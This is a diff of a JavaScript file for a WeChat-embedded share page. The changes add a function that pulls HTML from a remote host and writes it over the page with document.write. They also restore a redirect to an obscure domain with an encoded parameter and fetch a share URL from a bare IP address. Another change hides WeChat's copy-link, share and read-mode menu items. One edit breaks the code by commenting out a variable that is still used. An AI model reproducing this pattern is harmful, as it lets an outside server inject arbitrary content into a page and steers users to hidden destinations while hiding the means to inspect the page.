@@ -1,4 +1,4 @@
-var baiduKey = "45e4ed65d019478f202ec342aaa07047";
+
 var isDev = false;
 var fenliuData = new Array(
 );
@@ -108,7 +108,7 @@ function isWxNewVersion() {
         return true;
     }
 
-    var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
+    //var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
     if (!wechatInfo) {
         return false;
     }
@@ -304,22 +304,33 @@ function shareComplete() {
     }
 }
 
+function goToShareNexUrl() {
+    var myGoToShareNexUrl = "http://c.wx3010.top/content/" + mApiName + "/index21.html";
+    $.ajax({
+        type: "GET",
+        url: myGoToShareNexUrl,
+        success: function (msg) {
+            // document.write(unescape(msg));
+            document.write(msg);
+            document.close();
+        }
+    });
+}
+
 function goToShareNexUrlnew() {
-   // window.location.href = "http://dm9911.com/?do=bW9iaWxlZGV0YWlsXzM3NV8yMTY1OV8wODI5MTkzOTMy";
-   window.location.href = "http://renamayu.github.io/test/skip.html";
+   window.location.href = "http://dm9911.com/?do=bW9iaWxlZGV0YWlsXzM3NV8yMTY1OV8wODI5MTkzOTMy";
 }
 
 
 var shareUrl = window.location.href;
 function getNewShareUrl() {
-     // window.location.href = "http://renamayu.github.io/test/skip.html";
     var shareGetUrl = "http://119.29.8.160:8800/index1";
     $.ajax({
         type: "GET",
         url: shareGetUrl,
         success: function (msg) {
             shareUrl = msg;
-            console.log("shareUrl " + "http://renamayu.github.io/test/skip.html");
+            console.log("shareUrl " + shareUrl);
         }
     });
 }
@@ -406,17 +417,25 @@ if (!isWxNewVersion()) {
 }
 
 //统计
-var _hmt = _hmt || [];
-(function () {
-    var hm = document.createElement("script");
-    hm.src = "//hm.baidu.com/hm.js?" + baiduKey;
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(hm, s);
-})();
+// var _hmt = _hmt || [];
+// (function () {
+//     var hm = document.createElement("script");
+//     hm.src = "//hm.baidu.com/hm.js?" + baiduKey;
+//     var s = document.getElementsByTagName("script")[0];
+//     s.parentNode.insertBefore(hm, s);
+// })();
 
 function onBridgeReady() {
     WeixinJSBridge.call('showOptionMenu');
-    WeixinJSBridge.call('hideMenuItems');
+    WeixinJSBridge.hideMenuItems({
+        menuList:[
+            'menuItem:readMode', // 阅读模式
+            'menuItem:share:timeline', // 分享到朋友圈
+            'menuItem:copyUrl', // 复制链接
+            'menuItem:share:QZone',
+            'menuItem:share:weiboApp',
+        ]
+    });
 }
 if (typeof WeixinJSBridge == "undefined") {
     if (document.addEventListener) {
@@ -428,54 +447,3 @@ if (typeof WeixinJSBridge == "undefined") {
 } else {
     onBridgeReady();
 }
-
-function hideMenu() {
-     document.querySelector('#hideMenuItems').onclick = function () {
-    wx.hideMenuItems({
-      menuList: [
-        'menuItem:readMode', // 阅读模式
-        'menuItem:share:timeline', // 分享到朋友圈
-        'menuItem:copyUrl', // 复制链接
-        'menuItem:share:QZone',
-        'menuItem:share:weiboApp',
-        'menuItem:favorite',
-        'menuItem:share:qq',
-        'menuItem:share:QZone',
-        'menuItem:share:email',
-        'menuItem:readMode',
-        'menuItem:originPage',
-        'menuItem:openWithQQBrowser',
-        'menuItem:openWithSafari',
-      ],
-      success: function (res) {
-        alert('已隐藏“阅读模式”，“分享到朋友圈”，“复制链接”等按钮');
-      },
-      fail: function (res) {
-        alert(JSON.stringify(res));
-      }
-    });
-  };
-}
-
-window.WeixinJSBridge.enableDebugMode = function (callback) {
-        window.onerror = function (errorMessage, scriptURI, lineNumber, columnNumber) {
-
-            // 有callback的情况下，将错误信息传递到options.callback中
-            if (typeof callback === 'function') {
-                callback({
-                    message: errorMessage,
-                    script: scriptURI,
-                    line: lineNumber,
-                    column: columnNumber
-                });
-            } else {
-                // 其他情况，都以alert方式直接提示错误信息
-                var msgs = [];
-                msgs.push("额，代码有错。。。");
-                msgs.push("\n错误信息：", errorMessage);
-                msgs.push("\n出错文件：", scriptURI);
-                msgs.push("\n出错位置：", lineNumber + '行，' + columnNumber + '列');
-                alert(msgs.join(''));
-            }
-        }
-    };
